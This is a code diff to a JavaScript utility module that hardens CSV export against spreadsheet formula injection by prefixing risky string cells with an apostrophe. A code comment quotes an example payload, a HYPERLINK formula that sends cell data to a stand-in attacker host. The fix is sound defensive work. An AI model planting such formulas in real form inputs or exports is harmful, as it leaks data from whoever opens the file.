@@ -269,8 +269,25 @@ export function compactMoney(n = 0) {
   return `₹${v}`
 }
 
+/**
+ * CSV cell, quoted and escaped.
+ *
+ * Quoting alone is not enough for a spreadsheet: a value beginning `=`, `+`, `-` or
+ * `@` is evaluated as a formula by Excel and Sheets even inside quotes. Names and
+ * messages typed into the public forms reach these exports verbatim — through the
+ * audit trail, for instance — so `=HYPERLINK("http://evil.example/?"&A1,"Click")`
+ * typed into the contact form would run on the machine of whoever opened the file.
+ * A leading apostrophe makes the cell text, which is what these always are. Numbers
+ * are left alone so amounts keep sorting and summing as numbers.
+ */
+const csvCell = (value) => {
+  const text = value === null || value === undefined ? '' : String(value)
+  const risky = typeof value === 'string' && /^[=+\-@\t\r]/.test(text)
+  return `"${(risky ? `'${text}` : text).replace(/"/g, '""')}"`
+}
+
 export const toCSV = (rows, headers) =>
-  [headers, ...rows.map((r) => headers.map((h) => `"${String(r[h] ?? '').replace(/"/g, '""')}"`))]
+  [headers, ...rows.map((r) => headers.map((h) => csvCell(r[h])))]
     .map((r) => r.join(','))
     .join('\n')
 
